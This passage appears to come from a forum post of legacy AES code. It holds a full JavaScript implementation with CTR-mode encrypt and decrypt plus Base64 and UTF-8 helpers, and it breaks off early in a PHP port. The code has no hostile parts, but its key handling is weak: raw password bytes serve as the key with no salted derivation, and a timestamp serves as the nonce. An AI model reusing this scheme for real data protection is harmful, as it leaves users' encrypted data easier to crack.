(Nr+1 x Nb bytes)\r\n *\r\n *   applies Nr rounds (10\/12\/14) using key schedule w for 'add round key' stage\r\n *\r\n *   returns byte-array encrypted value (16 bytes)\r\n *\/\r\nfunction Cipher(input, w) {    \/\/ main Cipher function [\u00c2\u00a75.1]\r\n  var Nb = 4;               \/\/ block size (in words): no of columns in state (fixed at 4 for AES)\r\n  var Nr = w.length\/Nb - 1; \/\/ no of rounds: 10\/12\/14 for 128\/192\/256-bit keys\r\n\r\n  var state = [[],[],[],[]];  \/\/ initialise 4xNb byte-array 'state' with input [\u00c2\u00a73.4]\r\n  for (var i=0; i&lt;4*Nb; i++) state[i%4][Math.floor(i\/4)] = input[i];\r\n\r\n  state = AddRoundKey(state, w, 0, Nb);\r\n\r\n  for (var round=1; round&lt;Nr; round++) {\r\n    state = SubBytes(state, Nb);\r\n    state = ShiftRows(state, Nb);\r\n    state = MixColumns(state, Nb);\r\n    state = AddRoundKey(state, w, round, Nb);\r\n  }\r\n\r\n  state = SubBytes(state, Nb);\r\n  state = ShiftRows(state, Nb);\r\n  state = AddRoundKey(state, w, Nr, Nb);\r\n\r\n  var output = new Array(4*Nb);  \/\/ convert state to 1-d array before returning [\u00c2\u00a73.4]\r\n  for (var i=0; i&lt;4*Nb; i++) output[i] = state[i%4][Math.floor(i\/4)];\r\n  return output;\r\n}\r\n\r\n\r\nfunction SubBytes(s, Nb) {    \/\/ apply SBox to state S [\u00c2\u00a75.1.1]\r\n  for (var r=0; r&lt;4; r++) {\r\n    for (var c=0; c&lt;Nb; c++) s[r][c] = Sbox[s[r][c]];\r\n  }\r\n  return s;\r\n}\r\n\r\n\r\nfunction ShiftRows(s, Nb) {    \/\/ shift row r of state S left by r bytes [\u00c2\u00a75.1.2]\r\n  var t = new Array(4);\r\n  for (var r=1; r&lt;4; r++) {\r\n    for (var c=0; c&lt;4; c++) t[c] = s[r][(c+r)%Nb];  \/\/ shift into temp copy\r\n    for (var c=0; c&lt;4; c++) s[r][c] = t[c];         \/\/ and copy back\r\n  }          \/\/ note that this will work for Nb=4,5,6, but not 7,8 (always 4 for AES):\r\n  return s;  \/\/ see fp.gladman.plus.com\/cryptography_technology\/rijndael\/aes.spec.311.pdf \r\n}\r\n\r\n\r\nfunction MixColumns(s, Nb) {   \/\/ combine bytes of each col of state S [\u00c2\u00a75.1.3]\r\n  for (var c=0; c&lt;4; c++) {\r\n    var a = new Array(4);  \/\/ 'a' is a copy of the current column from 's'\r\n    var b = new Array(4);  \/\/ 'b' is a\u00e2\u20ac\u00a2{02} in GF(2^8)\r\n    for (var i=0; i&lt;4; i++) {\r\n      a[i] = s[i][c];\r\n      b[i] = s[i][c]&amp;0x80 ? s[i][c]&lt;&lt;1 ^ 0x011b : s[i][c]&lt;&lt;1;\r\n    }\r\n    \/\/ a[n] ^ b[n] is a\u00e2\u20ac\u00a2{03} in GF(2^8)\r\n    s[0][c] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3]; \/\/ 2*a0 + 3*a1 + a2 + a3\r\n    s[1][c] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3]; \/\/ a0 * 2*a1 + 3*a2 + a3\r\n    s[2][c] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3]; \/\/ a0 + a1 + 2*a2 + 3*a3\r\n    s[3][c] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3]; \/\/ 3*a0 + a1 + a2 + 2*a3\r\n  }\r\n  return s;\r\n}\r\n\r\n\r\nfunction AddRoundKey(state, w, rnd, Nb) {  \/\/ xor Round Key into state S [\u00c2\u00a75.1.4]\r\n  for (var r=0; r&lt;4; r++) {\r\n    for (var c=0; c&lt;Nb; c++) state[r][c] ^= w[rnd*4+c][r];\r\n  }\r\n  return state;\r\n}\r\n\r\n\r\nfunction KeyExpansion(key) {  \/\/ generate Key Schedule (byte-array Nr+1 x Nb) from Key [\u00c2\u00a75.2]\r\n  var Nb = 4;            \/\/ block size (in words): no of columns in state (fixed at 4 for AES)\r\n  var Nk = key.length\/4  \/\/ key length (in words): 4\/6\/8 for 128\/192\/256-bit keys\r\n  var Nr = Nk + 6;       \/\/ no of rounds: 10\/12\/14 for 128\/192\/256-bit keys\r\n\r\n  var w = new Array(Nb*(Nr+1));\r\n  var temp = new Array(4);\r\n\r\n  for (var i=0; i&lt;Nk; i++) {\r\n    var r = [key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]];\r\n    w[i] = r;\r\n  }\r\n\r\n  for (var i=Nk; i&lt;(Nb*(Nr+1)); i++) {\r\n    w[i] = new Array(4);\r\n    for (var t=0; t&lt;4; t++) temp[t] = w[i-1][t];\r\n    if (i % Nk == 0) {\r\n      temp = SubWord(RotWord(temp));\r\n      for (var t=0; t&lt;4; t++) temp[t] ^= Rcon[i\/Nk][t];\r\n    } else if (Nk &gt; 6 &amp;&amp; i%Nk == 4) {\r\n      temp = SubWord(temp);\r\n    }\r\n    for (var t=0; t&lt;4; t++) w[i][t] = w[i-Nk][t] ^ temp[t];\r\n  }\r\n\r\n  return w;\r\n}\r\n\r\nfunction SubWord(w) {    \/\/ apply SBox to 4-byte word w\r\n  for (var i=0; i&lt;4; i++) w[i] = Sbox[w[i]];\r\n  return w;\r\n}\r\n\r\nfunction RotWord(w) {    \/\/ rotate 4-byte word w left by one byte\r\n  var tmp = w[0];\r\n  for (var i=0; i&lt;3; i++) w[i] = w[i+1];\r\n  w[3] = tmp;\r\n  return w;\r\n}\r\n\r\n\r\n\/\/ Sbox is pre-computed multiplicative inverse in GF(2^8) used in SubBytes and KeyExpansion [\u00c2\u00a75.1.1]\r\nvar Sbox =  [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,\r\n             0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,\r\n             0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,\r\n             0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,\r\n             0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,\r\n             0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,\r\n             0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,\r\n             0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,\r\n             0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,\r\n             0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,\r\n             0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,\r\n             0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,\r\n             0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,\r\n             0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,\r\n             0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,\r\n             0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];\r\n\r\n\/\/ Rcon is Round Constant used for the Key Expansion [1st col is 2^(r-1) in GF(2^8)] [\u00c2\u00a75.2]\r\nvar Rcon = [ [0x00, 0x00, 0x00, 0x00],\r\n             [0x01, 0x00, 0x00, 0x00],\r\n             [0x02, 0x00, 0x00, 0x00],\r\n             [0x04, 0x00, 0x00, 0x00],\r\n             [0x08, 0x00, 0x00, 0x00],\r\n             [0x10, 0x00, 0x00, 0x00],\r\n             [0x20, 0x00, 0x00, 0x00],\r\n             [0x40, 0x00, 0x00, 0x00],\r\n             [0x80, 0x00, 0x00, 0x00],\r\n             [0x1b, 0x00, 0x00, 0x00],\r\n             [0x36, 0x00, 0x00, 0x00] ]; \r\n\r\n\r\n\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n\r\n\/** \r\n * Encrypt a text using AES encryption in Counter mode of operation\r\n *  - see http:\/\/csrc.nist.gov\/publications\/nistpubs\/800-38a\/sp800-38a.pdf\r\n *\r\n * Unicode multi-byte character safe\r\n *\r\n * @param plaintext source text to be encrypted\r\n * @param password  the password to use to generate a key\r\n * @param nBits     number of bits to be used in the key (128, 192, or 256)\r\n * @return          encrypted text\r\n *\/\r\nfunction AESEncryptCtr(plaintext, password, nBits) {\r\n  var blockSize = 16;  \/\/ block size fixed at 16 bytes \/ 128 bits (Nb=4) for AES\r\n  if (!(nBits==128 || nBits==192 || nBits==256)) return '';  \/\/ standard allows 128\/192\/256 bit keys\r\n  plaintext = plaintext.encodeUTF8();\r\n  password = password.encodeUTF8();\r\n  \/\/var t = new Date();  \/\/ timer\r\n\t\r\n  \/\/ use AES itself to encrypt password to get cipher key (using plain password as source for key \r\n  \/\/ expansion) - gives us well encrypted key\r\n  var nBytes = nBits\/8;  \/\/ no bytes in key\r\n  var pwBytes = new Array(nBytes);\r\n  for (var i=0; i&lt;nBytes; i++) {\r\n    pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);\r\n  }\r\n  var key = Cipher(pwBytes, KeyExpansion(pwBytes));  \/\/ gives us 16-byte key\r\n  key = key.concat(key.slice(0, nBytes-16));  \/\/ expand key to 16\/24\/32 bytes long\r\n\r\n  \/\/ initialise counter block (NIST SP800-38A \u00c2\u00a7B.2): millisecond time-stamp for nonce in 1st 8 bytes,\r\n  \/\/ block counter in 2nd 8 bytes\r\n  var counterBlock = new Array(blockSize);\r\n  var nonce = (new Date()).getTime();  \/\/ timestamp: milliseconds since 1-Jan-1970\r\n  var nonceSec = Math.floor(nonce\/1000);\r\n  var nonceMs = nonce%1000;\r\n  \/\/ encode nonce with seconds in 1st 4 bytes, and (repeated) ms part filling 2nd 4 bytes\r\n  for (var i=0; i&lt;4; i++) counterBlock[i] = (nonceSec &gt;&gt;&gt; i*8) &amp; 0xff;\r\n  for (var i=0; i&lt;4; i++) counterBlock[i+4] = nonceMs &amp; 0xff; \r\n  \/\/ and convert it to a string to go on the front of the ciphertext\r\n  var ctrTxt = '';\r\n  for (var i=0; i&lt;8; i++) ctrTxt += String.fromCharCode(counterBlock[i]);\r\n\r\n  \/\/ generate key schedule - an expansion of the key into distinct Key Rounds for each round\r\n  var keySchedule = KeyExpansion(key);\r\n  \r\n  var blockCount = Math.ceil(plaintext.length\/blockSize);\r\n  var ciphertxt = new Array(blockCount);  \/\/ ciphertext as array of strings\r\n  \r\n  for (var b=0; b&lt;blockCount; b++) {\r\n    \/\/ set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)\r\n    \/\/ done in two stages for 32-bit ops: using two words allows us to go past 2^32 blocks (68GB)\r\n    for (var c=0; c&lt;4; c++) counterBlock[15-c] = (b &gt;&gt;&gt; c*8) &amp; 0xff;\r\n    for (var c=0; c&lt;4; c++) counterBlock[15-c-4] = (b\/0x100000000 &gt;&gt;&gt; c*8)\r\n\r\n    var cipherCntr = Cipher(counterBlock, keySchedule);  \/\/ -- encrypt counter block --\r\n    \r\n    \/\/ block size is reduced on final block\r\n    var blockLength = b&lt;blockCount-1 ? blockSize : (plaintext.length-1)%blockSize+1;\r\n    var cipherChar = new Array(blockLength);\r\n    \r\n    for (var i=0; i&lt;blockLength; i++) {  \/\/ -- xor plaintext with ciphered counter char-by-char --\r\n      cipherChar[i] = cipherCntr[i] ^ plaintext.charCodeAt(b*blockSize+i);\r\n      cipherChar[i] = String.fromCharCode(cipherChar[i]);\r\n    }\r\n    ciphertxt[b] = cipherChar.join(''); \r\n  }\r\n\r\n  \/\/ Array.join is more efficient than repeated string concatenation\r\n  var ciphertext = ctrTxt + ciphertxt.join('');\r\n  ciphertext = ciphertext.encodeBase64();  \/\/ encode in base64\r\n  \r\n  \/\/alert((new Date()) - t);\r\n  return ciphertext;\r\n}\r\n\r\n\r\n\/** \r\n * Decrypt a text encrypted by AES in counter mode of operation\r\n *\r\n * @param ciphertext source text to be encrypted\r\n * @param password   the password to use to generate a key\r\n * @param nBits      number of bits to be used in the key (128, 192, or 256)\r\n * @return           decrypted text\r\n *\/\r\nfunction AESDecryptCtr(ciphertext, password, nBits) {\r\n  var blockSize = 16;  \/\/ block size fixed at 16 bytes \/ 128 bits (Nb=4) for AES\r\n  if (!(nBits==128 || nBits==192 || nBits==256)) return '';  \/\/ standard allows 128\/192\/256 bit keys\r\n  ciphertext = ciphertext.decodeBase64();\r\n  password = password.encodeUTF8();\r\n  \/\/var t = new Date();  \/\/ timer\r\n  \r\n  \/\/ use AES to encrypt password (mirroring encrypt routine)\r\n  var nBytes = nBits\/8;  \/\/ no bytes in key\r\n  var pwBytes = new Array(nBytes);\r\n  for (var i=0; i&lt;nBytes; i++) {\r\n    pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);\r\n  }\r\n  var key = Cipher(pwBytes, KeyExpansion(pwBytes));\r\n  key = key.concat(key.slice(0, nBytes-16));  \/\/ expand key to 16\/24\/32 bytes long\r\n\r\n  \/\/ recover nonce from 1st 8 bytes of ciphertext\r\n  var counterBlock = new Array(8);\r\n  ctrTxt = ciphertext.slice(0, 8);\r\n  for (var i=0; i&lt;8; i++) counterBlock[i] = ctrTxt.charCodeAt(i);\r\n  \r\n  \/\/ generate key schedule\r\n  var keySchedule = KeyExpansion(key);\r\n\r\n  \/\/ separate ciphertext into blocks (skipping past initial 8 bytes)\r\n  var nBlocks = Math.ceil((ciphertext.length-8) \/ blockSize);\r\n  var ct = new Array(nBlocks);\r\n  for (var b=0; b&lt;nBlocks; b++) ct[b] = ciphertext.slice(8+b*blockSize, 8+b*blockSize+blockSize);\r\n  ciphertext = ct;  \/\/ ciphertext is now array of block-length strings\r\n\r\n  \/\/ plaintext will get generated block-by-block into array of block-length strings\r\n  var plaintxt = new Array(ciphertext.length);\r\n\r\n  for (var b=0; b&lt;nBlocks; b++) {\r\n    \/\/ set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)\r\n    for (var c=0; c&lt;4; c++) counterBlock[15-c] = ((b) &gt;&gt;&gt; c*8) &amp; 0xff;\r\n    for (var c=0; c&lt;4; c++) counterBlock[15-c-4] = (((b+1)\/0x100000000-1) &gt;&gt;&gt; c*8) &amp; 0xff;\r\n\r\n    var cipherCntr = Cipher(counterBlock, keySchedule);  \/\/ encrypt counter block\r\n\r\n    var plaintxtByte = new Array(ciphertext[b].length);\r\n    for (var i=0; i&lt;ciphertext[b].length; i++) {\r\n      \/\/ -- xor plaintxt with ciphered counter byte-by-byte --\r\n      plaintxtByte[i] = cipherCntr[i] ^ ciphertext[b].charCodeAt(i);\r\n      plaintxtByte[i] = String.fromCharCode(plaintxtByte[i]);\r\n    }\r\n    plaintxt[b] = plaintxtByte.join('');\r\n  }\r\n\r\n  \/\/ join array of blocks into single plaintext string\r\n  var plaintext = plaintxt.join('');\r\n  plaintext = plaintext.decodeUTF8();  \/\/ decode from UTF8 back to Unicode multi-byte chars\r\n  \r\n  \/\/alert((new Date()) - t);\r\n  return plaintext;\r\n}\r\n\r\n\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n\r\n\/**\r\n * Encode string into Base64, as defined by RFC 4648 [http:\/\/tools.ietf.org\/html\/rfc4648]\r\n * (instance method extending String object). As per RFC 4648, no newlines are added.\r\n *\r\n * @param utf8encode optional parameter, if set to true Unicode string is encoded to UTF8 before \r\n *                   conversion to base64; otherwise string is assumed to be 8-bit characters\r\n * @return           base64-encoded string\r\n *\/ \r\nvar b64 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\/=&quot;;\r\n\r\nString.prototype.encodeBase64 = function(utf8encode) {  \/\/ http:\/\/tools.ietf.org\/html\/rfc4648\r\n  utf8encode =  (typeof utf8encode == 'undefined') ? false : utf8encode;\r\n  var o1, o2, o3, bits, h1, h2, h3, h4, e=[], pad = '', c, plain, coded;\r\n   \r\n  plain = utf8encode ? this.encodeUTF8() : this;\r\n  \r\n  c = plain.length % 3;  \/\/ pad string to length of multiple of 3\r\n  if (c &gt; 0) { while (c++ &lt; 3) { pad += '='; plain += '\\0'; } }\r\n  \/\/ note: doing padding here saves us doing special-case packing for trailing 1 or 2 chars\r\n  \r\n  for (c=0; c&lt;plain.length; c+=3) {  \/\/ pack three octets into four hexets\r\n    o1 = plain.charCodeAt(c);\r\n    o2 = plain.charCodeAt(c+1);\r\n    o3 = plain.charCodeAt(c+2);\r\n      \r\n    bits = o1&lt;&lt;16 | o2&lt;&lt;8 | o3;\r\n      \r\n    h1 = bits&gt;&gt;18 &amp; 0x3f;\r\n    h2 = bits&gt;&gt;12 &amp; 0x3f;\r\n    h3 = bits&gt;&gt;6 &amp; 0x3f;\r\n    h4 = bits &amp; 0x3f;\r\n\r\n    \/\/ use hextets to index into b64 string\r\n    e[c\/3] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);\r\n  }\r\n  coded = e.join('');  \/\/ join() is far faster than repeated string concatenation\r\n  \r\n  \/\/ replace 'A's from padded nulls with '='s\r\n  coded = coded.slice(0, coded.length-pad.length) + pad;\r\n   \r\n  return coded;\r\n}\r\n\r\n\/**\r\n * Decode string from Base64, as defined by RFC 4648 [http:\/\/tools.ietf.org\/html\/rfc4648]\r\n * (instance method extending String object). As per RFC 4648, newlines are not catered for.\r\n *\r\n * @param utf8decode optional parameter, if set to true UTF8 string is decoded back to Unicode  \r\n *                   after conversion from base64\r\n * @return           decoded string\r\n *\/ \r\nString.prototype.decodeBase64 = function(utf8decode) {\r\n  utf8decode =  (typeof utf8decode == 'undefined') ? false : utf8decode;\r\n  var o1, o2, o3, h1, h2, h3, h4, bits, d=[], plain, coded;\r\n\r\n  coded = utf8decode ? this.decodeUTF8() : this;\r\n  \r\n  for (var c=0; c&lt;coded.length; c+=4) {  \/\/ unpack four hexets into three octets\r\n    h1 = b64.indexOf(coded.charAt(c));\r\n    h2 = b64.indexOf(coded.charAt(c+1));\r\n    h3 = b64.indexOf(coded.charAt(c+2));\r\n    h4 = b64.indexOf(coded.charAt(c+3));\r\n      \r\n    bits = h1&lt;&lt;18 | h2&lt;&lt;12 | h3&lt;&lt;6 | h4;\r\n      \r\n    o1 = bits&gt;&gt;&gt;16 &amp; 0xff;\r\n    o2 = bits&gt;&gt;&gt;8 &amp; 0xff;\r\n    o3 = bits &amp; 0xff;\r\n    \r\n    d[c\/4] = String.fromCharCode(o1, o2, o3);\r\n    \/\/ check for padding\r\n    if (h4 == 0x40) d[c\/4] = String.fromCharCode(o1, o2);\r\n    if (h3 == 0x40) d[c\/4] = String.fromCharCode(o1);\r\n  }\r\n  plain = d.join('');  \/\/ join() is far faster than repeated string concatenation\r\n   \r\n  return utf8decode ? plain.decodeUTF8() : plain; \r\n}\r\n\r\n\/**\r\n * Encode multi-byte Unicode string into utf-8 multiple single-byte characters \r\n * (BMP \/ basic multilingual plane only) (instance method extending String object).\r\n *\r\n * Chars in range U+0080 - U+07FF are encoded in 2 chars, U+0800 - U+FFFF in 3 chars\r\n *\r\n * @return encoded string\r\n *\/\r\nString.prototype.encodeUTF8 = function() {\r\n  \/\/ use regular expressions &amp; String.replace callback function for better efficiency \r\n  \/\/ than procedural approaches\r\n  var str = this.replace(\r\n      \/[\\u0080-\\u07ff]\/g,  \/\/ U+0080 - U+07FF =&gt; 2 bytes 110yyyyy, 10zzzzzz\r\n      function(c) { \r\n        var cc = c.charCodeAt(0);\r\n        return String.fromCharCode(0xc0 | cc&gt;&gt;6, 0x80 | cc&amp;0x3f); }\r\n    );\r\n  str = str.replace(\r\n      \/[\\u0800-\\uffff]\/g,  \/\/ U+0800 - U+FFFF =&gt; 3 bytes 1110xxxx, 10yyyyyy, 10zzzzzz\r\n      function(c) { \r\n        var cc = c.charCodeAt(0); \r\n        return String.fromCharCode(0xe0 | cc&gt;&gt;12, 0x80 | cc&gt;&gt;6&amp;0x3F, 0x80 | cc&amp;0x3f); }\r\n    );\r\n  return str;\r\n}\r\n\r\n\/**\r\n * Decode utf-8 encoded string back into multi-byte Unicode characters\r\n * (instance method extending String object).\r\n *\r\n * @return decoded string\r\n *\/\r\nString.prototype.decodeUTF8 = function() {\r\n  var str = this.replace(\r\n      \/[\\u00c0-\\u00df][\\u0080-\\u00bf]\/g,                 \/\/ 2-byte chars\r\n      function(c) {  \/\/ (note parentheses for precence)\r\n        var cc = (c.charCodeAt(0)&amp;0x1f)&lt;&lt;6 | c.charCodeAt(1)&amp;0x3f;\r\n        return String.fromCharCode(cc); }\r\n    );\r\n  str = str.replace(\r\n      \/[\\u00e0-\\u00ef][\\u0080-\\u00bf][\\u0080-\\u00bf]\/g,  \/\/ 3-byte chars\r\n      function(c) {  \/\/ (note parentheses for precence)\r\n        var cc = ((c.charCodeAt(0)&amp;0x0f)&lt;&lt;12) | ((c.charCodeAt(1)&amp;0x3f)&lt;&lt;6) | ( c.charCodeAt(2)&amp;0x3f); \r\n        return String.fromCharCode(cc); }\r\n    );\r\n  return str;\r\n}\r\n\r\n\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n[\/CODE]\r\n\r\n\r\n\r\n\r\nPHP\r\n\r\n\r\n[CODE=&quot;php&quot;]\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n\r\n\/* aes.php Copyright \u00c2\u00a9 2005-2008 Chris Veness. Right of free use is granted for all \r\n *         commercial or non-commercial use. No warranty of any form is offered.\r\n *\/\r\n\r\n\/**\r\n * AES Cipher function: encrypt 'input' with Rijndael algorithm\r\n *\r\n * @param input message as byte-array (16 bytes)\r\n * @param w     key schedule as 2D byte-array (Nr+1 x Nb bytes) - \r\n *              generated from the cipher key by KeyExpansion()\r\n * @return      ciphertext as byte-array (16 bytes)\r\n *\/\r\nfunction Cipher($input, $w) {    \/\/ main Cipher function [\u00c2\u00a75.1]\r\n  $Nb = 4;                 \/\/ block size (in words): no of columns in state (fixed at 4 for AES)\r\n  $Nr = count($w)\/$Nb - 1; \/\/ no of rounds: 10\/12\/14 for 128\/192\/256-bit keys\r\n\r\n  $state = array();  \/\/ initialise 4xNb byte-array 'state' with input [\u00c2\u00a73.4]\r\n  for ($i=0; $i&lt;4*$Nb; $i++) $state[$i%4][floor($i\/4)] = $input[$i];\r\n\r\n  $state = AddRoundKey($state, $w, 0, $Nb);\r\n\r\n  for ($round=1; $round&lt;$Nr; $round++) {  \/\/ apply Nr rounds\r\n    $state = SubBytes($state, $Nb);\r\n    $state = ShiftRows($state, $Nb);\r\n    $state = MixColumns($state, $Nb);\r\n    $state = AddRoundKey($state, $w, $round, $Nb);\r\n  }\r\n\r\n  $state = SubBytes($state, $Nb);\r\n  $state = ShiftRows($state, $Nb);\r\n  $state = AddRoundKey($state, $w, $Nr, $Nb);\r\n\r\n  $output = array(4*$Nb);  \/\/ convert state to 1-d array before returning [\u00c2\u00a73.4]\r\n  for ($i=0; $i&lt;4*$Nb; $i++) $output[$i] = $state[$i%4][floor($i\/4)];\r\n  return $output;\r\n}\r\n\r\n\r\nfunction AddRoundKey($state, $w, $rnd, $Nb) {  \/\/ xor Round Key into state S [\u00c2\u00a75.1.4]\r\n  for ($r=0; $r&lt;4; $r++) {\r\n    for ($c=0; $c&lt;$Nb; $c++) $state[$r][$c] ^= $w[$rnd*4+$c][$r];\r\n  }\r\n  return $state;\r\n}\r\n\r\nfunction SubBytes($s, $Nb) {    \/\/ apply SBox to state S [\u00c2\u00a75.1.1]\r\n  global $Sbox;  \/\/ PHP needs explicit declaration to access global variables!\r\n  for ($r=0; $r&lt;4; $r++) {\r\n    for ($c=0; $c&lt;$Nb; $c++) $s[$r][$c] = $Sbox[$s[$r][$c]];\r\n  }\r\n  return $s;\r\n}\r\n\r\nfunction ShiftRows($s, $Nb) {    \/\/ shift row r of state S left by r bytes [\u00c2\u00a75.1.2]\r\n  $t = array(4);\r\n  for ($r=1; $r&lt;4; $r++) {\r\n    for ($c=0; $c&lt;4; $c++) $t[$c] = $s[$r][($c+$r)%$Nb];  \/\/ shift into temp copy\r\n    for ($c=0; $c&lt;4; $c++) $s[$r][$c] = $t[$c];         \/\/ and copy back\r\n  }          \/\/ note that this will work for Nb=4,5,6, but not 7,8 (always 4 for AES):\r\n  return $s;  \/\/ see fp.gladman.plus.com\/cryptography_technology\/rijndael\/aes.spec.311.pdf \r\n}\r\n\r\nfunction MixColumns($s, $Nb) {   \/\/ combine bytes of each col of state S [\u00c2\u00a75.1.3]\r\n  for ($c=0; $c&lt;4; $c++) {\r\n    $a = array(4);  \/\/ 'a' is a copy of the current column from 's'\r\n    $b = array(4);  \/\/ 'b' is a\u00e2\u20ac\u00a2{02} in GF(2^8)\r\n    for ($i=0; $i&lt;4; $i++) {\r\n      $a[$i] = $s[$i][$c];\r\n      $b[$i] = $s[$i][$c]&amp;0x80 ? $s[$i][$c]&lt;&lt;1 ^ 0x011b : $s[$i][$c]&lt;&lt;1;\r\n    }\r\n    \/\/ a[n] ^ b[n] is a\u00e2\u20ac\u00a2{03} in GF(2^8)\r\n    $s[0][$c] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3]; \/\/ 2*a0 + 3*a1 + a2 + a3\r\n    $s[1][$c] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3]; \/\/ a0 * 2*a1 + 3*a2 + a3\r\n    $s[2][$c] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3]; \/\/ a0 + a1 + 2*a2 + 3*a3\r\n    $s[3][$c] = $a[0] ^ $b[0] ^ $a[1] ^ $a[2] ^ $b[3]; \/\/ 3*a0 + a1 + a2 + 2*a3\r\n  }\r\n  return $s;\r\n}\r\n\r\n\/**\r\n * Key expansion for Rijndael Cipher(): performs key expansion on cipher key\r\n * to generate a key schedule\r\n *\r\n * @param key cipher key byte-array (16 bytes)\r\n * @return    key schedule as 2D byte-array (Nr+1 x Nb bytes)\r\n *\/\r\nfunction KeyExpansion($key) {  \/\/ generate Key Schedule from Cipher Key [\u00c2\u00a75.2]\r\n  global $Rcon;  \/\/ PHP needs explicit declaration to access global variables!\r\n  $Nb = 4;              \/\/ block size (in words): no of columns in state (fixed at 4 for AES)\r\n  $Nk = count($key)\/4;  \/\/ key length (in words): 4\/6\/8 for 128\/192\/256-bit keys\r\n  $Nr = $Nk + 6;        \/\/ no of rounds: 10\/12\/14 for 128\/192\/256-bit keys\r\n\r\n  $w = array();\r\n  $temp = array();\r\n\r\n  for ($i=0; $i&lt;$Nk; $i++) {\r\n    $r = array($key[4*$i], $key[4*$i+1], $key[4*$i+2], $key[4*$i+3]);\r\n    $w[$i] = $r;\r\n  }\r\n\r\n  for ($i=$Nk; $i&lt;($Nb*($Nr+1)); $i++) {\r\n    $w[$i] = array();\r\n    for ($t=0; $t&lt;4; $t++) $temp[$t] = $w[$i-1][$t];\r\n    if ($i % $Nk == 0) {\r\n      $temp = SubWord(RotWord($temp));\r\n      for ($t=0; $t&lt;4; $t++) $temp[$t] ^= $Rcon[$i\/$Nk][$t];\r\n    } else if ($Nk &gt; 6 &amp;&amp; $i%$Nk == 4) {\r\n      $temp = SubWord($temp);\r\n    }\r\n    for ($t=0; $t&lt;4; $t++) $w[$i][$t] = $w[$i-$Nk][$t] ^ $temp[$t];\r\n  }\r\n  return $w;\r\n}\r\n\r\nfunction SubWord($w) {    \/\/ apply SBox to 4-byte word w\r\n  global $Sbox;  \/\/ PHP needs explicit declaration to access global variables!\r\n  for ($i=0; $i&lt;4; $i++) $w[$i] = $Sbox[$w[$i]];\r\n  return $w;\r\n}\r\n\r\nfunction RotWord($w) {    \/\/ rotate 4-byte word w left by one byte\r\n  $w[4] = $w[0];\r\n  for ($i=0; $i&lt;4; $i++) $w[$i] = $w[$i+1];\r\n  return $w;\r\n}\r\n\r\n\/\/ Sbox is pre-computed multiplicative inverse in GF(2^8) used in SubBytes and KeyExpansion [\u00c2\u00a75.1.1]\r\n$Sbox =  array(0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,\r\n               0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,\r\n               0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,\r\n               